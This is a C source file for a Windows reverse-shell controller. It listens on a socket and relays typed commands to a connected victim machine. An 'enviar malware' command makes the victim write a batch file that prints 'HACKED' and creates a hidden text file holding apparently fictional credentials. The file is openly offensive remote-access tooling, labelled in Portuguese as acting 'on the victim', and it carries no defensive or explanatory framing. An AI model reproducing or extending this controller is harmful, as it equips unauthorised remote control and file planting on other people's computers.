#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32")

#define PORT 8081
#define BUFFER_SIZE 4096

int main() {
    WSADATA wsa;
    SOCKET listener, client;
    struct sockaddr_in server, client_addr;
    int client_len = sizeof(client_addr);
    char command[BUFFER_SIZE];
    char response[BUFFER_SIZE];
    int bytes_received;

    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        printf("[!] WSAStartup failed\n");
        return 1;
    }

    if ((listener = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("[!] Socket creation failed\n");
        WSACleanup();
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(PORT);

    if (bind(listener, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("[!] Bind failed\n");
        closesocket(listener);
        WSACleanup();
        return 1;
    }

    listen(listener, 1);
    printf("[*] Waiting for connection on port %d...\n", PORT);

    client = accept(listener, (struct sockaddr *)&client_addr, &client_len);
    if (client == INVALID_SOCKET) {
        printf("[!] Accept failed\n");
        closesocket(listener);
        WSACleanup();
        return 1;
    }

    printf("[+] Connection from %s\n", inet_ntoa(client_addr.sin_addr));
    printf("[*] Type 'help' for commands\n\n");

    while (1) {
        printf("Shell> ");
        fgets(command, sizeof(command), stdin);
        command[strcspn(command, "\n")] = '\0';

        if (strcmp(command, "exit") == 0) break;
        
        if (strcmp(command, "help") == 0) {
            printf("\nCommands:\n");
            printf("cd [dir]    - Change directory and show new location\n");
            printf("cd..        - Go up one directory and show new location\n");
            printf("dir         - List files in current directory\n");
            printf("pwd         - Show current directory\n");
            printf("enviar malware - Cria um arquivo batch personalizado\n");
            printf("exit        - Quit\n\n");
            continue;
        }

        if (strcmp(command, "enviar malware") == 0) {
            char filename[256];
            
            printf("Digite o nome do arquivo batch (sem extensao): ");
            fgets(filename, sizeof(filename), stdin);
            filename[strcspn(filename, "\n")] = '\0';
            
            if (strstr(filename, ".bat") == NULL) {
                strcat(filename, ".bat");
            }
            
            char bat_command[BUFFER_SIZE];
            snprintf(bat_command, sizeof(bat_command), 
                "echo @echo off > \"%s\" && "
                "echo echo HACKED >> \"%s\" && "
                "echo echo -- Credenciais para nÇœo esquecer -- > ceoData.txt >> \"%s\" && "
                "echo echo Nome: connorLewinsky@cybertech.cia >> ceoData.txt >> \"%s\" && "
                "echo echo Senha: eo{96*GYC]k8.cia >> ceoData.txt >> \"%s\" && "
                "echo echo Credencial: 0000-1 >> ceoData.txt >> \"%s\" && "
                "echo attrib +h ceoData.txt >> \"%s\" && "
                "echo start \"\" \"ceoData.txt\" >> \"%s\" && "
                "echo pause >> \"%s\"",
                filename, filename, filename, filename, filename, filename, filename, filename);
            
            printf("[*] Criando arquivo %s na vitima...\n", filename);
            
            if (send(client, bat_command, strlen(bat_command), 0) <= 0) {
                printf("[!] Connection lost\n");
                break;
            }
            
            while ((bytes_received = recv(client, response, BUFFER_SIZE-1, 0)) > 0) {
                response[bytes_received] = '\0';
                printf("%s", response);
                if (strstr(response, "[CMD_END]")) break;
            }
            
            continue;
        }

        if (send(client, command, strlen(command), 0) <= 0) {
            printf("[!] Connection lost\n");
            break;
        }

        while ((bytes_received = recv(client, response, BUFFER_SIZE-1, 0)) > 0) {
            response[bytes_received] = '\0';
            printf("%s", response);
            if (strstr(response, "[CMD_END]")) break;
        }

        if (bytes_received <= 0) {
            printf("[!] Connection error\n");
            break;
        }
    }

    closesocket(client);
    closesocket(listener);
    WSACleanup();
    return 0;
}